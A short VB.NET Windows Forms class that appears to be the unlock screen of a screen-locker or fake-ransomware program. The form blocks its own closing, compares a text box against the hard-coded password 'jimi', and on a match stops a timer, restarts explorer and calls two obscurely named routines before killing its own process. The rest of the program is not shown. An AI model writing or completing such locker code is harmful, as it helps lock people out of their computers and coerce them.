Public Class Form2
    Private Sub Form2_Closing(ByVal sender As Object, ByVal e As System.ComponentModel.CancelEventArgs) Handles MyBase.Closing
        e.Cancel = True
    End Sub

    Private Sub BonfireButton1_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles BonfireButton1.Click

        Dim prd As String = TextBox1.Text()

        If prd = "jimi" Then

            Form1.Timer1.Enabled = False
            Process.Start("explorer")
            Form1.oimliumlis()
            Form1.okcxsdry5()
            Process.GetCurrentProcess.Kill()
        Else

            Me.Width = 591
            Me.Height = 234
            Wow1.Width = 591
            Wow1.Height = 234
            BonfireAlertBox1.Visible = True

        End If
    End Sub

    Private Sub Form2_Load(ByVal sender As Object, ByVal e As System.EventArgs) Handles Me.Load
        BonfireAlertBox1.Visible = False
    End Sub

End Class